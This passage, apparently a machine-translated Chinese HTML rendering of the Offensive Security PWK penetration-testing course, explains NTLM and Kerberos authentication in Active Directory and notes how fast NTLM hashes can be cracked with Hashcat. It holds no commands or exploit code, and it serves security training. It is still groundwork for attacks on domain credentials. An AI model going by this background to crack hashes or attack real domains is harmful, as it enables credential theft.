<div style="position:absolute;top:29082;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个部分。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:29144;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Active Directory 使用 Kerberos </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">640</font></font></font></nobr></div>
<div style="position:absolute;top:29144;left:440"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或 NTLM 身份验证</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">641</font></font></font></nobr></div>
<div style="position:absolute;top:29144;left:659"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">大多数协议</font></font></nobr></div>
<div style="position:absolute;top:29163;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">身份验证尝试。</font><font style="vertical-align: inherit;">我们将首先讨论更简单的 NTLM 协议。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:29198;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.3.1</font></font></i></nobr></div>
<div style="position:absolute;top:29198;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NTLM 身份验证</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:29236;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当客户端通过 IP 地址（而不是通过 IP 地址）向服务器进行身份验证时，将使用 NTLM 身份验证</font></font></nobr></div>
<div style="position:absolute;top:29255;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机名），</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">642</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或者如果用户尝试对未在主机上注册的主机名进行身份验证</font></font></nobr></div>
<div style="position:absolute;top:29274;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Active Directory 集成 DNS 服务器。</font><font style="vertical-align: inherit;">同样，第三方应用程序可能会选择使用 NTLM</font></font></nobr></div>
<div style="position:absolute;top:29294;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">身份验证而不是 Kerberos 身份验证。</font></font></nobr></div>
<div style="position:absolute;top:29327;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NTLM 身份验证协议由七个步骤组成，如图 309 所示并解释</font></font></nobr></div>
<div style="position:absolute;top:29346;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下面深入。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:29687;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">639 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2003 年），https:</font></font><font style="vertical-align: inherit;"> //technet.microsoft.com/en-us/library/cc778868 </font><font style="font-size:9px"><font style="vertical-align: inherit;">(v=</font></font><font style="vertical-align: inherit;"> ws.10 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">).aspx</font></font></font></nobr></div>
<div style="position:absolute;top:29707;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">640 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2003 年），https:</font></font><font style="vertical-align: inherit;"> //technet.microsoft.com/en-us/library/cc780469 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(v=ws.10).aspx</font></font></font></nobr></div>
<div style="position:absolute;top:29727;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">641 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2017 年），https:</font></font><font style="vertical-align: inherit;"> //msdn.microsoft.com/en-us/library/windows/desktop/aa378749 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(v=vs.85).aspx</font></font></font></nobr></div>
<div style="position:absolute;top:29747;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">642 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2013 年），https://blogs.msdn.microsoft.com/chiranth/2013/09/20/ntlm-want-to-know-how-it-works/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:29875;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="26"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 26 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:29908;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:30985;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:30985;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:30985;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">643</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:30469;left:277"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 309：Active Directory 中的 NTLM 身份验证图</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:30500;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在第一个身份验证步骤中，计算机计算一个加密哈希，称为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NTLM</font></font></i></nobr></div>
<div style="position:absolute;top:30519;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hash</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，来自用户的密码。</font><font style="vertical-align: inherit;">接下来，客户端计算机将用户名发送到服务器，服务器</font></font></nobr></div>
<div style="position:absolute;top:30538;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回一个名为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nonce</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">challenge</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的随机值</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">然后客户端使用</font></font></nobr></div>
<div style="position:absolute;top:30557;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NTLM 哈希，现在称为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">响应</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，并将其发送到服务器。</font></font></nobr></div>
<div style="position:absolute;top:30590;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器将响应连同用户名和随机数转发到域控制器。</font></font></nobr></div>
<div style="position:absolute;top:30610;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后由域控制器执行验证，因为它已经知道 NTLM 哈希</font></font></nobr></div>
<div style="position:absolute;top:30629;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所有用户中。</font><font style="vertical-align: inherit;">域控制器使用所提供的 NTLM 哈希值对质询本身进行加密</font></font></nobr></div>
<div style="position:absolute;top:30649;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">username 并将其与从服务器收到的响应进行比较。</font><font style="vertical-align: inherit;">如果两者相等，则</font></font></nobr></div>
<div style="position:absolute;top:30668;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">认证请求成功。</font></font></nobr></div>
<div style="position:absolute;top:30700;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与任何其他哈希一样，NTLM 无法反转。</font><font style="vertical-align: inherit;">但是，它被认为是“快速散列”</font></font></nobr></div>
<div style="position:absolute;top:30720;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码算法，因为即使是适度的密码也可以在几天内破解</font></font></nobr></div>
<div style="position:absolute;top:30739;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">装备</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">643</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:30801;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过使用 Hashcat 等具有顶级图形处理器的破解软件，</font></font></i></nobr></div>
<div style="position:absolute;top:30821;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">每秒可以测试超过 6000 亿个 NTLM 哈希值。</font><font style="vertical-align: inherit;">这意味着</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:30935;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">643 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Jeremi M Gosney, 2017), https://gist.github.com/epixoip/ace60d09981be09544fdd35005051505</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:31063;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="27"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 27 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:31096;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:32173;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:32173;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:32173;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">644</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:31192;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以在 2.5 小时内测试所有 8 个字符的密码，所有 9 个字符的密码</font></font></i></nobr></div>
<div style="position:absolute;top:31211;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字符密码可在 11 天内进行测试。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:31273;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来我们将转向 Kerberos，它是 Active Directory 中的默认身份验证协议和</font></font></nobr></div>
<div style="position:absolute;top:31293;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于相关服务。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:31327;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.3.2</font></font></i></nobr></div>
<div style="position:absolute;top:31327;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kerberos 身份验证</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:31365;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft 使用的 Kerberos 身份验证协议是从 Kerberos 版本 5 中采用的</font></font></nobr></div>
<div style="position:absolute;top:31384;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MIT 创建的身份验证协议，已被用作 Microsoft 的主要身份验证</font></font></nobr></div>
<div style="position:absolute;top:31403;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自 Windows Server 2003 以来的机制。虽然 NTLM 身份验证通过以下原则工作</font></font></nobr></div>
<div style="position:absolute;top:31423;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">质询和响应，基于 Windows 的 Kerberos 身份验证使用票证系统。</font></font></nobr></div>
<div style="position:absolute;top:31456;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在较高级别上，对 Active Directory 中的服务的 Kerberos 客户端身份验证涉及使用</font></font></nobr></div>
<div style="position:absolute;top:31475;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域控制器充当密钥分发中心或 KDC。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">644</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个过程如图</font></font></nobr></div>
<div style="position:absolute;top:31495;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">310.</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:32123;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">644 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2017 年），https://en.wikipedia.org/wiki/Key_distribution_center</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:32251;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="28"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 28 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:32284;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:33361;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:33361;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:33361;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">645</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:32957;left:322"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 310：Kerberos 身份验证图 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:33439;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="29"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 29 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:33472;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:34549;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:34549;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:34549;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">646</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:33562;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.3.2.1.1</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:33583;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们详细回顾一下这个过程，以便为进一步讨论奠定基础。</font></font></nobr></div>
<div style="position:absolute;top:33616;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，当用户登录到他们的工作站时，一个请求被发送到域控制器，</font></font></nobr></div>
<div style="position:absolute;top:33635;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它具有 KDC 的作用，同时还维护着 Authentication Server 服务。</font><font style="vertical-align: inherit;">这个</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">认证</font></font></i></nobr></div>
<div style="position:absolute;top:33654;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器请求</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（或</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AS_REQ</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）包含一个时间戳，该时间戳使用从</font></font></nobr></div>
<div style="position:absolute;top:33674;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">645 的</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码</font><font style="vertical-align: inherit;">和用户名。</font></font></nobr></div>
<div style="position:absolute;top:33706;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当域控制器收到请求时，它会查找与</font></font></nobr></div>
<div style="position:absolute;top:33726;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特定用户并尝试解密时间戳。</font><font style="vertical-align: inherit;">如果解密过程成功</font></font></nobr></div>
<div style="position:absolute;top:33745;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并且时间戳不是重复的（潜在的重放攻击），则考虑身份验证</font></font></nobr></div>
<div style="position:absolute;top:33764;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成功的。</font></font></nobr></div>
<div style="position:absolute;top:33797;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域控制器使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">身份验证服务器回复</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">( </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AS_REP</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )</font><i><font style="vertical-align: inherit;">回复</font></i><font style="vertical-align: inherit;">客户端</font></font></nobr></div>
<div style="position:absolute;top:33817;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包含一个会话密钥（因为 Kerberos 是无状态的）和一个</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">票证授予票证</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(TGT)。</font><font style="vertical-align: inherit;">会议</font></font></nobr></div>
<div style="position:absolute;top:33836;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密钥使用用户的密码散列进行加密，并且可以由客户端解密并重复使用。</font></font></nobr></div>
<div style="position:absolute;top:33855;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TGT 包含有关用户的信息，包括组成员身份、域、时间</font></font></nobr></div>
<div style="position:absolute;top:33875;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">戳、客户端的 IP 地址和会话密钥。</font></font></nobr></div>
<div style="position:absolute;top:33907;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了避免篡改，Ticket Granting Ticket 用一个只有自己知道的密钥加密。</font></font></nobr></div>
<div style="position:absolute;top:33927;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">KDC，客户端无法解密。</font><font style="vertical-align: inherit;">一旦客户端收到会话密钥并</font></font></nobr></div>
<div style="position:absolute;top:33946;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TGT，KDC 认为客户端身份验证完成。</font><font style="vertical-align: inherit;">默认情况下，TGT 的有效期为</font></font></nobr></div>
<div style="position:absolute;top:33966;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10 小时，之后进行续订。</font><font style="vertical-align: inherit;">此续订不需要用户重新输入</font></font></nobr></div>
<div style="position:absolute;top:33985;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码。</font></font></nobr></div>
<div style="position:absolute;top:34017;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当用户希望访问域的资源时，例如网络共享、Exchange</font></font></nobr></div>
<div style="position:absolute;top:34037;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">邮箱或其他具有注册服务主体名称的应用程序，它必须再次联系</font></font></nobr></div>
<div style="position:absolute;top:34056;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">KDC。</font></font></nobr></div>
<div style="position:absolute;top:34089;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这一次，客户端构造了一个</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">票证授予服务请求</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（或</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TGS_REQ</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）数据包，其中包括</font></font></nobr></div>
<div style="position:absolute;top:34109;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当前用户和时间戳（使用会话密钥加密），资源的 SPN，</font></font></nobr></div>
<div style="position:absolute;top:34128;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和加密的 TGT。</font></font></nobr></div>
<div style="position:absolute;top:34161;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，KDC 上的票据授予服务接收 TGS_REQ，如果 SPN 存在于</font></font></nobr></div>
<div style="position:absolute;top:34180;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域，TGT 是使用只有 KDC 知道的密钥解密的。</font><font style="vertical-align: inherit;">然后会话密钥是</font></font></nobr></div>
<div style="position:absolute;top:34199;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从 TGT 中提取并用于解密请求的用户名和时间戳。</font><font style="vertical-align: inherit;">作为这个</font></font></nobr></div>
<div style="position:absolute;top:34219;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">KDC 执行多项检查：</font></font></nobr></div>
<div style="position:absolute;top:34251;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. TGT 必须有一个有效的时间戳（没有检测到重放并且请求没有过期）。</font></font></nobr></div>
<div style="position:absolute;top:34280;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. TGS_REQ 中的用户名必须与 TGT 中的用户名匹配。</font></font></nobr></div>
<div style="position:absolute;top:34308;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3、客户端IP地址需要与TGT IP地址一致。</font></font></nobr></div>
<div style="position:absolute;top:34341;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果此验证过程成功，则票证授予服务向客户端响应</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">票证</font></font></i></nobr></div>
<div style="position:absolute;top:34361;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">授予服务器回复</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TGS_REP</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">这个包包含三个部分：</font></font></nobr></div>
<div style="position:absolute;top:34393;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 已授予访问权限的 SPN。</font></font></nobr></div>
<div style="position:absolute;top:34422;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 要在客户端和 SPN 之间使用的会话密钥。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:34485;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">645 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Skip Duckwall，2014 年），https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:34500;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">伙计们-不要得到它-wp.pdf </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:34627;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="30"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 30 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:34660;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:35737;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:35737;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:35737;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">647</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:34756;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.</font><font style="vertical-align: inherit;">包含用户名和组成员身份以及新的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务票证</font></font></i><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:34775;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建的会话密钥。</font></font></nobr></div>
<div style="position:absolute;top:34808;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">前两部分（SPN 和会话密钥）使用与</font></font></nobr></div>
<div style="position:absolute;top:34827;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TGT 的创建和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务票证</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font><i><font style="vertical-align: inherit;">服务</font></i><font style="vertical-align: inherit;">的密码哈希加密</font></font></nobr></div>
<div style="position:absolute;top:34847;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用相关 SPN 注册的帐户。</font></font></nobr></div>
<div style="position:absolute;top:34879;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦 KDC 的身份验证过程完成并且客户端拥有会话密钥和</font></font></nobr></div>
<div style="position:absolute;top:34899;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务票证，服务认证开始。</font></font></nobr></div>
<div style="position:absolute;top:34931;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，客户端向应用服务器发送一个</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用请求</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AP_REQ</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，其中包括</font></font></nobr></div>
<div style="position:absolute;top:34951;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用与服务票证关联的会话密钥加密的用户名和时间戳</font></font></nobr></div>
<div style="position:absolute;top:34970;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连同服务票本身。</font></font></nobr></div>
<div style="position:absolute;top:35003;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用程序服务器使用服务帐户密码哈希解密服务票证并</font></font></nobr></div>
<div style="position:absolute;top:35023;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提取用户名和会话密钥。</font><font style="vertical-align: inherit;">然后它使用后者来解密用户名</font></font></nobr></div>
